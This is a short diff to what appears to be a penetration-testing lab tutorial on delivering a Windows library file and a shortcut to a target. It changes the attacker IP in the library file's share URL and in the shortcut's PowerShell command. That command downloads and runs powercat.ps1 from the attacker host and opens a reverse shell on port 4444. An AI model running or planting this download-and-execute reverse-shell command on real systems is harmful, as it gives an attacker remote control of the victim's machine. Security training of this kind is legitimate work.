@@ -240,7 +240,7 @@ Enter the following content for the file:
 <isDefaultSaveLocation>true</isDefaultSaveLocation>
 <isSupported>false</isSupported>
 <simpleLocation>
-<url>http://192.168.45.184</url>
+<url>http://192.168.45.157</url>
 </simpleLocation>
 </searchConnectorDescription>
 </searchConnectorDescriptionList>
@@ -258,7 +258,7 @@ If we re-open our file in Visual Studio Code, we find that a new tag appeared na
 The shortcut will contain the following command:
 
 ```
-powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.184:8000/powercat.ps1'); powercat -c 192.168.45.184 -p 4444 -e powershell"
+powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.157:8000/powercat.ps1'); powercat -c 192.168.45.157 -p 4444 -e powershell"
 
 ```
 
